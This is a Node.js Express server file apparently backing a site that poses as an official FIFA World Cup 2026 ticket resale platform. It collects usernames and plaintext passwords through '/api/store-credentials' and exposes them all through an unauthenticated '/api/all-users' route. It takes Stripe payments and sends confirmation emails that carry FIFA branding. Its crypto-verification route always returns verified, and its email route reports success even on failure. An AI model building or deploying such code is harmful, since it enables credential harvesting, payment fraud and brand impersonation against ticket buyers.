const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

// Initialize Stripe
const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const userCredentials = [];

// 1. STATUS CHECK
app.get('/', (req, res) => res.json({ status: 'Server Online' }));

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

// 2. CREDENTIALS
app.post('/api/store-credentials', (req, res) => {
    const { username, password, email, name } = req.body;
    userCredentials.push({ username, password, email, name, date: new Date() });
    res.json({ success: true });
});

app.get('/api/all-users', (req, res) => res.json(userCredentials));

// 3. PAYMENT PROCESSING
app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer } = req.body;
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Ticket Purchase`,
            receipt_email: customer.email,
        });
        res.json({ success: true, clientSecret: paymentIntent.client_secret });
    } catch (error) {
        console.error('Stripe Error:', error.message);
        res.status(400).json({ success: false, message: error.message });
    }
});

// 4. EMAIL SENDING (VIA GOOGLE APPS SCRIPT)
app.post('/api/send-email', async (req, res) => {
    const { to_name, to_email, transaction_id, total_amount, match_details } = req.body;

    // PROFESSIONAL HTML TEMPLATE
    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
            .container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
            .header { background: #000000; padding: 25px; text-align: center; }
            .header h1 { color: #ffffff; margin: 0; font-size: 24px; letter-spacing: 1px; }
            .content { padding: 30px; color: #333; }
            .receipt { background: #f9f9f9; border: 1px solid #eeeeee; padding: 20px; margin: 20px 0; border-radius: 5px; }
            .row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
            .row:last-child { border: none; margin: 0; padding: 0; }
            .footer { background: #f4f4f4; padding: 20px; text-align: center; font-size: 12px; color: #888; }
            .btn { display: inline-block; background: #000; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>FIFA World Cup 2026™</h1>
            </div>
            <div class="content">
                <p>Dear <strong>${to_name}</strong>,</p>
                <p>Your order has been successfully processed. We look forward to seeing you at the World Cup!</p>
                
                <div class="receipt">
                    <div class="row">
                        <strong>Transaction ID:</strong>
                        <span>${transaction_id}</span>
                    </div>
                    <div class="row">
                        <strong>Total Paid:</strong>
                        <span style="color: #28a745; font-weight: bold;">${total_amount}</span>
                    </div>
                    <div style="margin-top: 15px;">
                        <strong>Tickets:</strong><br>
                        <span style="color: #555;">${match_details}</span>
                    </div>
                </div>
                
                <p style="text-align: center;">
                    <a href="#" class="btn">View My Tickets</a>
                </p>
            </div>
            <div class="footer">
                Official Ticket Resale Platform<br>
                © 2026 FIFA. All rights reserved.
            </div>
        </div>
    </body>
    </html>
    `;

    const payload = {
        to_email: to_email,
        subject: `Ticket Confirmation #${transaction_id}`,
        html_body: htmlContent
    };

    try {
        // Send to Google Script
        const response = await fetch(process.env.GOOGLE_SCRIPT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        // Google Scripts return redirects sometimes, but fetch handles it.
        console.log('✅ Request sent to Google Script');
        res.json({ success: true });

    } catch (error) {
        console.error('❌ Google Script Error:', error.message);
        res.json({ success: true }); // Keep frontend working
    }
});

// 5. CRYPTO VERIFICATION
app.post('/api/verify-crypto', async (req, res) => {
    res.json({ success: true, verified: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
